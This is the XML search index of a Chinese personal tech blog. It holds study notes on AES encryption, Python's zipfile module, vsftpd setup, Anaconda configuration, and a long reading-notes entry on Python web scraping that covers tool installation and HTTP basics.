<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[AES加密]]></title>
    <url>%2F2020%2F03%2F29%2FAES%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[AES加密详解AES加密涉及到四种操作，分别是字节代替，行移位，列混淆和轮密钥加。看起来很高大上，其实把这几个名词理解了，加密过程也就通透了。 解密过程分别为对应的逆操作，由于每一步操作都是可逆的，按照相反的顺序进行解密即可恢复明文。 加解密过程中每轮密钥都由初始密钥扩展得到，在每一次轮密钥加的操作中用到。 根据分组长度128bit，密钥长度128bit/192bit/256bit分别加密不同的轮数（10，12，14）。 算法中16个字节(128bit)的明文密文密钥都以一个4*4的矩阵表示。 输入明文 轮密钥加 {字节代替，行移位，列混淆，轮密钥加}循环进行n-1轮 字节代替，行移位，轮密钥加 输出密文 字节替代字节替代的主要功能是通过S盒完成一个字节到另一个字节的映射，说白了就是查表。S盒用于提供密码算法的混淆性。输入的高4bit对应的值为行标，低4bit对应的值为列标。 行移位行移位是一个4*4的矩阵内部字节之间的置换，用于提供算法的扩展性。加密时，第一行保持不变，第二行循环左移8bit(矩阵中的一格)，第三行循环左移16bit(矩阵中的两格)，第四行循环左移24bit(矩阵中的三格)。 1state[i][j] = state[i][(j+1)%4],i,j∈[0,3] 列混淆利用GF(2⁸)域上算数特性的一个代替，同样用于提供算法的扩散性。 由矩阵乘法，在列混淆的过程中，每个字节对应的值只与该列的四个值有关。此处乘法和加法都是定义在GF(2⁸)上的。 将某个字节所对应的值乘以2，其结果就是将该值的二进制位左移一位，如果原始值的最高位为1，则还需要将移位后的结果异或00011011； 乘法对加法满足分配率，例如：07·S0,0=(01⊕02⊕04)·S0,0= S0,0⊕(02·S0,0)(04·S0,0)。 此处的矩阵乘法与一般意义上矩阵的乘法有所不同，各个值在相加时使用的是模2⁸加法（异或运算）。形式是矩阵乘法的形式，运算不是一般意义乘法的运算。 轮密钥加操作相对简单，依据的原理是“任何数和自身的异或结果为0”，加密过程中吗，每轮的输入与轮子密钥异或一次。解密时再异或一次即可恢复。 密钥扩展 密钥扩展过程说明： 1) 将种子密钥按图(a)的格式排列，其中k0、k1、……、k15依次表示种子密钥的一个字节；排列后用4个32比特的字表示，分别记为w[0]、w[1]、w[2]、w[3]； 2) 按照如下方式，依次求解w[j]，其中j是整数并且属于[4,43]； 3) 若j%4=0,则w[j]=w[j-4]⊕g(w[j-1]),否则w[j]=w[j-4]⊕w[j-1]； 函数g的流程说明： a) 将w循环左移8比特； b) 分别对每个字节做S盒置换； c) 与32比特的常量（RC[j/4],0,0,0）进行异或，RC是一个一维数组，其值如下。（RC的值只需要有10个，而此处用了11个，实际上RC[0]在运算中没有用到，增加RC[0]是为了便于程序中用数组表示。由于j的最小取值是4，j/4的最小取值则是1，因此不会产生错误。） RC = {0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36}]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python的zipfile模块]]></title>
    <url>%2F2020%2F03%2F25%2Fpython%E7%9A%84zipfile%E6%A8%A1%E5%9D%97%2F</url>
    <content type="text"><![CDATA[zipfile是python里用来做zip格式编码的压缩和解压缩的。有两个非常常用的class, 分别是ZipFile和ZipInfo, 在绝大多数的情况下，我们只需要使用这两个class就可以了。 ZipFile是主要的类，用来创建和读取zip文件而ZipInfo是存储的zip文件的每个文件的信息的。 ZipFile和Zipinfo这两个类的基本操作1class zipfile.ZipFile(file,mode,compression,allowZip64) 创建一个ZipFile对象，表示一个zip文件。参数file表示文件的路径,参数mode指示打开zip文件的模式，默认值为’r’，表示读已经存在的zip文件，也可以为’w’或’a’，’w’表示新建一个zip文档或覆盖一个已经存在的zip文档,’a’表示将数据附加到一个现存的zip文档中。参数compression表示在写zip文档时使用的压缩方法，它的值可以是zipfile. ZIP_STORED 或zipfile. ZIP_DEFLATED。如果要操作的zip文件大小超过2G，应该将allowZip64设置为True。 1ZipFile.getinfo(name) 获取zip文档内指定文件的信息。返回一个zipfile.ZipInfo对象，它包括文件的详细信息。 1ZipFile.infolist() 获取zip文档内所有文件的信息，返回一个zipfile.ZipInfo的列表。 1ZipFile.namelist() 获取zip文档内所有文件的名称列表。 1ZipFile.extract(member, path, pwd) 将zip文档内的指定文件解压到当前目录。参数member指定要解压的文件名称或对应的ZipInfo对象；参数path指定了解析文件保存的文件夹；参数pwd为解压密码。 1os.getcwd() 用于返回当前工作目录。 1os.path.join() 连接两个或更多的路径名组件。1.如果各组件名首字母不包含’/’，则函数会自动加上。2.如果有一个组件是一个绝对路径，则在它之前的所有组件均会被舍弃。3.如果最后一个组件为空，则生成的路径以一个’/’分隔符结尾。 1ZipFile.extractall(path, members, pwd) 解压zip文档中的所有文件到当前目录。参数members的默认值为zip文档内的所有文件名称列表，也可以自己设置，选择要解压的文件名称。 1ZipFile.printdir() 将zip文档内的信息打印到控制台上。 1ZipFile.setpassword(pwd) 设置zip文档的密码。 1ZipFile.read(name, pwd) 获取zip文档内指定文件的二进制数据。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Docker]]></title>
    <url>%2F2020%2F03%2F24%2FDocker%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[FTP配置]]></title>
    <url>%2F2020%2F03%2F21%2FFTP%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[说起来有点搞笑，查到腾讯云的教程，看webshell的标准登陆方式，发现出来个二维码让我登录，愣了愣，想起来自己领的是阿里云。 Vsftpd即very secure FTP daemon，是众多Linux发行版本中默认的FTP服务器。安装步骤： 首先执行以下命令安装vsftpd。 1yum install -y vsftpd 设置vsftpd开机自启。 1systemctl enable vsftpd 启动FTP服务。 1systemctl start vsftpd 确认启动。 1netstat -antup | grep ftp 配置vsftpd。 12useradd namepasswd name后输入密码]]></content>
      <tags>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读书笔记之python3网络爬虫开发实战]]></title>
    <url>%2F2020%2F03%2F17%2F%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B9%8Bpython3%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%2F</url>
    <content type="text"><![CDATA[[TOC] 第一章：环境配置Python3的安装推荐了Anaconda，注意环境变量配置。 作者推荐解决版本冲突问题的方法：将安装目录中的python.exe复制一份，命名为python3.exe，能够更好地区分python版本。 请求库的安装爬虫可以简单分为几步：抓取页面，分析页面和存储数据。在抓取页面的过程中，我们需要模拟浏览器向服务器发出请求，所以需要python库来实现HTTP请求操作。 requests的安装 分为pip+库名安装，wheel（原来后缀为.whl是这个意思，安装好wheel库后直接用pip3命令+文件名）安装与源码安装（这个没听过，cd requests，python3 setup.py install）。 2.Selenium的安装 Selenium是一个自动化测试工具，利用它可以驱使浏览器执行特定动作，如点击/下拉。对于JS渲染的页面非常有效。 安装方式同上，但还需要配置浏览器来配合其工作。 ChromeDriver安装安装ChromeDriver能够驱动Chrome完成相应的操作。注意在Chrome中输入chrome://version/查看版本，不同版本的Chrome与ChromeDriver不适配。 下载完后将ChromeDriver.exe放到Chrome安装的文件夹并配置环境变量（用户变量）。 1234567命令行配置环境变量的快捷方式：export PATH=&quot;$PATH:复制的路径&quot;保存后执行如下命令：source ~/.profile测试：from selenium import webdriverbrowser = webdriver.Chrome() 此处在cmd中执行该命令报错没有selenium这个模块，百度得知是selenium不能通过pip install安装，要到官网下载然后在解压路径下执行python setup.py install.就是第三种源码安装。这回总算没报错，算是每种方法都尝试过了。 aiohttp的安装requests库是一个阻塞式HTTP请求库，当我们发出一个请求后，程序会一直等待服务器响应，直到得到响应后才会进行下一步处理。这个过程很耗时间。如果程序可以在这个等待过程中做一些其他事情，则会大大提高爬取效率。aiohttp就是这样提供异步web服务的库，从python3.5开始加入了async/await关键字，使得回调的写法更加直观与人性化。aiohttp借助于async/await。 123pip install aiohttppip install cchardet aiodns lxml的安装lxml是python的解析库，支持HTML和XML解析，支持XPath解析方式。 如果没有任何报错，则证明安装成功。如果出现报锚，比如提示缺少libxml2库等信息，可以采用wheel方式安装。推荐直接到这里（链接为：http://www.lfd.uci.edu/-goblke/pythonlibs/#lxml）下载对应的wheel文件，找到本地安装Python版本和系统对应的lxml版本，例如Windows64位、Python3.6，就选作lxml-3 .8.0-cp36-cp36m-win _ amd64. whl，将其下载到本地。然后pip。 Beauitful Soup安装Beauitful Soup是python的一个HTML或XML解析库，我们可以用它方便地从网页中提取数据，它拥有强大的API与多样的解析方式。 版本管理真是个奇妙的事情，好好用conda（为啥镜像源还会报错） ，以及pip与pip3，pycharm里安装了bs4，cmd中安装了beautifulsoup4，但是import的时候还是报错，就很难过。看了挺多中文办法，不得行。还是stack overflow上讲的明白： 123ou have the module installed for Python 2.7, however you&apos;re using and trying to import it with Python 3.6.You have to use pip3 like you use python3. 注意这里我们虽然安装的是beautifulsoup4这个包，但是在引入的时候却是bs4，因为这个包源代码本身的库文件夹的名称就是bs4.所以安装完成之后，这个库文件夹就被移入到本机python3的lib库里，所以识别到的库文件名就是bs4. pyquery的安装强大的网页解析工具，提供了和jQuery类似的语法来解析HTML文档，支持CSS选择器。 tesserocr安装爬虫过程中难免会遇到各种各样验证码，并且还是图形验证码，此时可以用OCR来识别。 OCR，即Optical Character Recognition，光学字符识别，指通过扫描字符，然后通过其形状将其翻译成电子文本的过程。tesserocr是Python的一个OCR识别库，实际上是对tesseract做的一层python API封装，所以在安装前者前要安装后者。下载tesseract，记住勾选Additional language data来安装OCR识别支持的语言包。 安装完后注意要配置环境变量，现在终于知道环境变量是用来干嘛的了，是为了在使用命令行的时候能够直接使用某种命令，如python，tesseract。 在系统环境变量中，Path添加tesseract的安装目录。在系统环境变量中，添加变量“TESSDATA_PREFIX”，变量值为tessdata文件夹所在路径。注意系统要重启。 命令： tesseract [xxx.jpg/png/etc] [result.txt|stdout] [-l eng | chi_sim] 如果要输入文字到result.txt中，需要以管理员身份运行cmd。指定字库的时候，只需要字库的前缀。eng.traineddata，只输入并且只能输入eng。 tesseract命令第一个参数为图片名称，第二个参数result为结果保存的目标文件名，-l指定使用的语言包，eng即英文。 验证安装： 123456from PIL import Imageimport pytesseract text = pytesseract.image_to_string(Image.open(r&apos;D:\My Tools\image.png&apos;))print(text)//Image.open读取了图片文件，然后调用pytesseract的image_to_string方法。 数据库的安装：作为数据存储的重要部分，数据库必不可少，可以分为关系型数据库和非关系型数据库，前者数据库以表的形式存储，后哦这存储形式为键值对，更加灵活。MySQL是一个轻量级的关系数据库，MongoDB使用C++编写的非关系型数据库，是一个基于分布式文件存储的开源数据库系统（啥意思），其存储方式类似JSON对象，字段值可以包含其他文档，数组以及文档数组。 可视化工具：RoboMongo/Robo 3T，Studio 3T。 安装了Redis，Host没找对，直接输入local就行，结果搞了很久。看起来一直在努力找资料，实际上太懒了根本没动脑子。 存储库的安装：PyMySQL/PyMongo/redis-py（用于与redis交互） RedisDump安装：他是一个用于Redis数据导入导出的工具，基于Ruby实现。 安装Ruby后就可执行gem命令，类似于pip。 1gem install redis-dump 验证安装 12redis-dumpredis-load Web库的安装：Flask，Django这样的一些web服务程序是基于python开发的，我们可以拿他来开发网站和接口。目前主要使用这些web服务程序来搭建一些API接口供爬虫使用。 API:Application Programming Interface，应用程序接口，是一些预先定义的函数，或者说软件系统不同组成部分衔接的约定。 目的是提供应用程序与开发人员基于某软件或硬件得以访问一组例程的能力，而又无需访问原码，或理解内部工作机制的细节。 Flask安装Flask是一个轻量级的web服务程序，此处主要用来做一些API服务。 1pip3 install flask 验证安装总没法成功，再找找原因。 验证的脚本出错了，问题在于最后一段。 123456789101112131415#!/usr/bin/env python # -*- coding:utf-8 -*-#导入了Flask类from flask import Flask#创建一个该类的实例app = Flask(__name__)#route装饰器告诉告诉Flask什么样的URL能够触发函数@app.route(&apos;/&apos;)#这个函数的名字也在生成 URL 时被特定的函数采用，这个函数返回我们想要显示在用户#浏览器中的信息。def hello_world(): return &apos;Hello World!&apos;#最后我们用 run() 函数来让应用运行在本地服务器上。 其中 if __name__ #==&apos;__main__&apos;: 确保服务器只会在该脚本被 Python 解释器直接执行的时候才会运行，而不是作为模块导入的时候。if __name__ == &apos;__main__&apos;: app.run() 后面将利用Flask+Redis维护动态代理池和Cookie池。 Tornado安装Tornado是一个支持异步的Web框架，通过使用非阻塞I/O流，支持上千万的开放连接。 pip3安装，后面将利用Tornado+redis来搭建一个ADSL拨号代理池。 APP爬取相关库的安装：除了Web网页，爬虫也可以抓取APP数据。APP中页面加载所需要的数据通过请求服务器的接口获取。由于APP没有浏览器这种直观看到后台请求的数据，所以主要使用一些抓包工具来抓取数据。一些简单的接口可以使用Charles或者mitmproxy分析，找出规律，然后直接利用程序模拟来抓取。更复杂的接口利用mitmdump，对抓取到的请求进行实时处理与保存。自动化APP工具：Appium，可以像selenium一样对App进行自动化控制，模拟点击等操作。 Cherles的安装Charles是一个网络抓包工具，这里主要选用为移动端抓包工具。 证书配置：现在很多页面都在向HTTPS发展，如果一个App通信应用了HTTPS协议，那么它的通信数据是会被加密的，常规的抓包方法无法识别请求的内部数据。如果要做HTTPS抓包的话，需要配置相关的SSL证书。Help&gt;SSL Proxying&gt;install Charles Root Certificate,将所有的证书放入下列存储，然后浏览选择受信任的根证书颁发机构。 使用Charles代理手机请求：找WLAN的设定就找了很久，长按修改，进阶模式。但是设置好代理之后一直连接不上网络，监听不了，是啥原因？等到后面实战移动端的时候再肝一下。 mitmproxy的安装暂时不用 Appium的安装Appium负责驱动移动端来完成一系列操作，对于Android来说，它使用UIAutomator和Selendroid来实现驱动。Android开发环境配置，之后再看。Android SDK与Android Studio 爬虫框架的安装：我们直接用requests,Selenium等库写爬虫，如果爬取量不是太大，速度要求不高，完全可以满足需求。但是写多了就会发现其内部许多代码与组件是完全可以复用的。把这些组件抽离出来，将各个功能模块化，就会形成爬虫框架。 pyspider的安装安装完报错，讲到时再试。 12345678910111213Traceback (most recent call last): File &quot;C:\Users\Lenovo\AppData\Local\Programs\Python\Python37\Scripts\pyspider-script.py&quot;, line 11, in &lt;module&gt; load_entry_point(&apos;pyspider==0.3.10&apos;, &apos;console_scripts&apos;, &apos;pyspider&apos;)() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 489, in load_entry_point return get_distribution(dist).load_entry_point(group, name) File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2793, in load_entry_point return ep.load() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2411, in load return self.resolve() File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pkg_resources\__init__.py&quot;, line 2417, in resolve module = __import__(self.module_name, fromlist=[&apos;__name__&apos;], level=0) File &quot;c:\users\lenovo\appdata\local\programs\python\python37\lib\site-packages\pyspider\run.py&quot;, line 231 async=True, get_object=False, no_input=False): Scrapy的安装连上V2ray和不连v2ray，在用镜像源安装的时候差别居然这么大。注意安装好各种前置的库。 Scrapy-Splash的安装需要Docker Scrapy-Redis的安装1pip3 install scrapy-redis 部署相关库的安装：如果想要大规模抓取数据，那么一定会用到分布式爬虫。对于分布式爬虫，需要多台主机，每台主机上有多个爬虫任务，但只有一份源代码。此时需要做的就是将一份代码同时部署到多台主机上来运行。 对于Scrapy，名为Scrapyd的扩展组件能够帮助我们远程管理Scrapy任务，包括部署源码，启动任务，监听任务等等。Scrapy-Client和Scrapyd API非常实用。 或者利用Docker集群部署，只需要将爬虫只作为Docker镜像。只要主机中安装了Docker，就能够直接运行爬虫，无需担心环境与版本问题。 Docker的安装hyper-v，谜之报错，安装完发现不需要，不需要也就算了还不共存，不共存也就算了还不能删。 可能是要安装docker for Windows？可不是说只支持专业版，这样一说要修改注册表？ 修改了注册表，但是依旧报错。 老子不装了，等到后面学分布式爬虫再说。注意不能学啥都学的太浅薄，不然根本没有用。 Scrapyd的安装需要linux环境，后面有需要再看。 Scrapyd-Client的安装基于Scrapyd Scrapyd API安装基于Scrapyd Scrapyrt的安装Scrapyrt为Scrapy提供了一个调度的HTTP接口，有了它我们可以通过请求一个HTTP接口来调度Scrapy任务。Scarpyrt比Scrapyd更轻量，如果不需要分布式多任务，可简单实用Scarpyrt实现远程Scrapy任务调度。 Gerapy的安装1pip3 install gerapy 第二章：爬虫基础HTTP基本原理URI与URLURI：Uniform Resource Identifier，统一资源标识符。URL：Universal Resource Locator，统一资源定位符。URL是URI的真子集，URI还包括一个子集叫做URN：Universal Resource Name，统一资源名称。URN只命名资源而不定位资源。如URN:isbn：xxxx指定了一本书的ISBN，能够唯一标识这本书，但是没有定位。 URL一定能够定位但可能没有名称，URN一定有名称但可能不能定位。 超文本hypertext浏览器中看到的网页就是一系列HTML代码（超文本）解析而成，最后呈现出来并不以代码本身，而是标识出的别的形式。 HTTP与HTTPS两者都是访问资源需要的协议类型，有时还会看到ftp，sftp，smb开头的URL，它们都是协议类型。在爬虫中一般抓取的是HTTP与HTTPS协议的。 HTTP：Hyper Text Transfer Protocol，超文本传输协议。HTTP协议用于从网络传输超文本数据到本地浏览器的传输协议。目前广泛使用的是HTTP1.1版本。 HTTPS的全称是Hyper Text Transfer Protocol over Secure Socket Layer，是在HTTP下加入SSL层，HTTP的安全版。 HTPPS的安全基础是SSL，因此通过它传输的内容都是经过SSL加密的，主要有两种作用： 建立一个信息安全通道来保证数据的安全。 确认网站的真实性：凡是使用了HTTPS的网站，都可以通过点击浏览器的锁头标志来查看网站认证之后的真实信息。也可以通过CA机构颁发的安全签章来查询。 某些网站虽然使用了HTTPS协议，但是还是被浏览器提示不安全，这是因为其CA证书是自行签发而不被CA机构所信任，但实际上仍然是经过SSL加密的。如果要爬取这样的站点，就要忽略证书的选项，否则会提示SSL链接错误。 HTTP请求过程访问网站的过程实际上是在浏览器中输入一个URL后，浏览器向网站所在的服务器发送一个请求，网站服务器接收到这个请求后进行处理与解析，然后返回对应的响应，接着传回给浏览器。这个”响应”里包含了页面的源代码等内容，浏览器对其进行解析后便呈现了出来。 打开Chrome浏览器，右键选择“检查”，Network监听组件能够直观地现实访问当前请求网页时所发生的所有网络请求和响应。其中各列表示的意思如下： Name：请求的名称，一般会将URL的最后一部分内容当作名称。 Status：响应的状态码，通过状态码我们可以判断发送了请求之后是否得到了正常的响应。 Type：请求的文档类型，有jpeg，png，stylesheet，document等。 Initiator：请求源，用于标记请求是由哪个对象或者进程发起的。 Size：从服务器下载的文件和请求资源的大小。如果是从缓存中取得的资源，则该列会显示from cache。 Time：发起请求到获取响应所用的总时间。 Waterfall：网络请求的可视化瀑布流。 请求由客户端向服务端发出，分为请求方法，请求网址，请求头与请求体。 请求方法：常见的请求方法有GET与POST。GET：在浏览器中输入URL并回车，便发起了一个URL请求，请求的参数会直接包含到URL中，比如https://www.baidu.com/s?wd=python,参数wd就表示要搜索的关键字。POST请求大多在表单提交时发起，用于提交数据等，其数据以表单的形式传输，而不会体现在URL中。 二者区别：GET请求的参数包含在URL中，数据能够直接看到。而POST的数据会包含在请求体中，URL中看不到。GET请求提交的数据最多只有1024字节，而POST无限制。一般来说传递敏感信息与发送较大文件，都用POST请求。 1 GET 请求指定的页面信息，并返回实体主体。 2 HEAD 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头 3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。 4 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 5 DELETE 请求服务器删除指定的页面。 6 CONNECT HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。 7 OPTIONS 允许客户端查看服务器的性能。 8 TRACE 回显服务器收到的请求，主要用于测试或诊断。 9 PATCH 是对 PUT 方法的补充，用来对已知资源进行局部更新 。 请求网址：URL，能够确定请求的资源。 请求头：用于说明服务器要使用的附加信息，如Cookie，Referer，User-Agent 常用的头信息： Accept：请求报头域，用于指定客户端可以接受哪些类型的信息。 Host：用于指定请求资源的主机IP和端口号，其内容为URL的原始服务器/网关的位置。从HTTP1.1开始，请求必须包含此内容。 Cookie：网站为了辨别用户进行会话跟踪而存储在用户本地的数据。主要功能是维持当前会话，即使再次刷新也能够无需再次输入信息。Cookies里有信息标识了对应服务器的会话，每次浏览器在请求该站点页面时，都会在请求头中加入Cookies并将其发送给服务器。服务器通过Cookies识别出身份，直接返回登陆后的页面。 Referer：用于标识这个请求的来源，服务器可以拿到此信息做相应处理。 User-Agent：UA，特殊的字符串头，可以使服务器识别客户使用的操作系统（版本）/浏览器(版本)。在做爬虫时加上此信息，可以伪装成浏览器，否则很可能被识别为爬虫。 Content-Type：互联网媒体类型，MIME类型。它用于表示具体请求中的媒体类型信息： text/html代表HTML格式(XML数据)。image/gif代表GIF图片。application/json代表JSON类型。只有设置Content-Type为application/x-www-form-urlencoded，才会以表单数据形式提交。appilcation/json来提交(序列化)JSON数据。multipart/form-data来上传(表单)文件。blabla。 在爬虫中，如果要构造POST请求，需要使用正确的Content-Type，并了解各种请求库的各个参数设置时使用的是哪种Type，不然会导致POST提交后无法正常响应。 请求体：请求体一般承载的内容是POST请求中的表单数据，相对于GET请求，请求体为空。 响应：由服务端返回给客户端，可以分成响应状态码Request Status Code，响应头Response Headers和响应体Response Body。 响应状态码：表示服务器的响应状态，在爬虫中我们根据状态码来判断响应状态。 1** 信息，服务器收到请求，需要请求者继续执行操作 2** 成功，操作被成功接收并处理 3** 重定向，需要进一步的操作以完成请求 4** 客户端错误，请求包含语法错误或无法完成请求 5** 服务器错误，服务器在处理请求的过程中发生了错误 100 Continue 继续。客户端应继续其请求 101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 200 OK 请求成功。一般用于GET与POST请求 201 Created 已创建。成功请求并创建了新的资源 202 Accepted 已接受。已经接受请求，但未处理完成 203 Non-Authoritative Information 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 204 No Content 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 205 Reset Content 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 206 Partial Content 部分内容。服务器成功处理了部分GET请求 300 Multiple Choices 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 301 Moved Permanently 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 302 Found 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI 303 See Other 查看其它地址。与301类似。使用GET和POST请求查看 304 Not Modified 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 305 Use Proxy 使用代理。所请求的资源必须通过代理访问 306 Unused 已经被废弃的HTTP状态码 307 Temporary Redirect 临时重定向。与302类似。使用GET请求重定向 400 Bad Request 客户端请求的语法错误，服务器无法理解 401 Unauthorized 请求要求用户的身份认证 402 Payment Required 保留，将来使用 403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求 404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 405 Method Not Allowed 客户端请求中的方法被禁止 406 Not Acceptable 服务器无法根据客户端请求的内容特性完成请求 407 Proxy Authentication Required 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 408 Request Time-out 服务器等待客户端发送的请求时间过长，超时 409 Conflict 服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突 410 Gone 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 411 Length Required 服务器无法处理客户端发送的不带Content-Length的请求信息 412 Precondition Failed 客户端请求信息的先决条件错误 413 Request Entity Too Large 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 414 Request-URI Too Large 请求的URI过长（URI通常为网址），服务器无法处理 415 Unsupported Media Type 服务器无法处理请求附带的媒体格式 416 Requested range not satisfiable 客户端请求的范围无效 417 Expectation Failed 服务器无法满足Expect的请求头信息 500 Internal Server Error 服务器内部错误，无法完成请求 501 Not Implemented 服务器不支持请求的功能，无法完成请求 502 Bad Gateway 作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应 503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 504 Gateway Time-out 充当网关或代理的服务器，未及时从远端服务器获取请求 505 HTTP Version not supported 服务器不支持请求的HTTP协议的版本，无法完成处理 响应头：包含服务器对请求的应答信息： Date:响应标识产生的时间 Last-Modified：指定资源的最后修改时间。 Content-Encoding：指定响应内容的编码。 Server：包含服务器的信息，名称，版本号等。 Content-Type:返回的文档类型。 Set-Cookie：设置Cookies。响应头中的Set-Cookie告诉浏览器需要将此内容放在Cookies中，下次请求携带Cookies请求。 Expires:指定响应的过期时间，可以使代理服务器或浏览器将加载的内容更新到缓存中。如果再次访问，就可以直接从缓存中加载，以降低服务器负载，缩短加载时间。 响应体：响应的正文数据都在响应体中，例如请求网页时，其响应体就是王爷的HTML代码。请求图片时便是图片的二进制数据。做爬虫请求网页后要解析的内容就是响应体。 网页基础基本组成，结构和节点等内容。 网页的组成：HTML.CSS.JavaScript，HTML相当于骨架，CSS相当于皮肤，JavaScript相当于肌肉。 HTML：由于学校课程学过比较熟悉，它是用来描述网页的一种超文本标记语言。不同类型的文字通过不同类型的标签来表示，如img，p等标签。他们之间的布局又常通过布局标签div嵌套组合而成，各种标签通过不同的排列和嵌套形成网页的框架。 CSS：只有HTML的页面布局并不美观，CSS全称Cascading Style Sheets,即层叠样式表。层叠是指当在HTML中引用了数个样式文件，并且样式发生冲突时，浏览器能够依据层叠顺序处理。样式指网页中文字大小，颜色，元素间距排列等格式。 1234567891011//大括号前是一个CSS选择器，意思是选择id为head_wrpper且class为s-ps-lite的节点，然后再选中其内部的class为s-p-top的节点。大括号内部写的是样式规则。#head_wrapper.s-ps-islite,s-p-top&#123;//position指定了这个元素的布局方式为绝对布局 position:absolute;//bottom指定元素的下边距为40px bottom:40px;//width指定了宽度为100%占满父元素 width:100%;//height指定元素的高度 height:181px;&#125; 在网页中，一般会统一定义整个网页的CSS样式规则，并写入CSS文件中（后缀为css）。在HTML中只要用link标签就能够引入写好的css文件。 JavaScript:是一种脚本语言，HTML与CSS配合使用，提供给用户的只是一种静态的信息缺乏交互，这要靠JS实现。JS通常也是以单独的文件加载的，后缀为js，通过在HTML标签引用。]]></content>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Anaconda教程]]></title>
    <url>%2F2020%2F03%2F16%2FAnaconda%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[Anaconda指的是一个开源的Python发行版本，其包含了Python、conda等180多个科学包及其依赖项。 因为包含了大量的科学包，Anaconda 的下载文件比较大。Anaconda对于python初学者而言及其友好，相比单独安装python主程序，选择Anaconda可以帮助省去很多麻烦，Anaconda里添加了许多常用的功能包，如果单独安装python，这些功能包则需要一条一条自行安装，在Anaconda中则不需要考虑这些，同时Anaconda还附带捆绑了两个非常好用的交互式代码编辑器（Spyder、Jupyter notebook）。 1.安装什么的就略过，没什么大问题。 2.安装完后用下面的命令检查是否安装成功以及升级以及安装的库 12conda --versionconda upgrade --all 3.最好换上国内的镜像源，如清华的： 1234conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/conda config --set show_channel_urls yes 在anaconda prompt中执行，并且删去C:\User\Lenovo.condarc中的 1- defaults 查看配置的命令： 1conda config --show 4.碰上清华的镜像源也不太好用，搞了很久一直报错： 123456CondaHTTPError: HTTP 000 CONNECTION FAILED for url &lt;https://conda.anaconda.org/conda-forge/win-64/repodata.json&gt;Elapsed: -An HTTP error occurred when trying to retrieve this URL.HTTP errors are often intermittent, and a simple retry will get you on your way.&apos;https://conda.anaconda.org/conda-forge/win-64&apos; 最后重启居然好了，玄学，应该是某些配置需要重启生效吧。 5.安装scrapy的时候发现还是不行，得，继续肝吧。 6.升级Anaconda 1conda update conda 7.Anaconda环境管理 1conda info –envs 列出所有的环境 8.创建一个环境 1conda create -n env_name python=2.7 9.镜像源不是加的越多越好,一个一个试试最好。 10. 1[WinError 193] %1 不是有效的 Win32 应用程序。 这个报错产生的原因是python位数和dll位数不一样，dll是32位，而python是64位。（还是第一次知道python也有64位32位之分）。 解决办法： 1.安装64位的dll(一般很难找到)。 2.安装32位的python，同时用anaconda保证64位的与32位的共存。 具体步骤如下： 12set CONDA_FORCE_32BIT=1是切换到32位，set CONDA_FORCE_32BIT=是切换到64位。//这样切换环境对已经安装的python没有任何影响，原来是64位的python还是64位，所以需要切换到32位以后创建个虚拟环境安装python。并且安装需要在prompt下进行，在navigator中默认python是64位的。 讲道理我觉得scrapy作为这么著名的框架，应该不会出现这种问题吧。 11.切换虚拟环境 1conda acticvate env_name,conda deactivate env_name 12.移除环境： 1conda deactivate env_name 13.查看当前代理优先级： 1conda config --get channels 14.与Pycharm连接 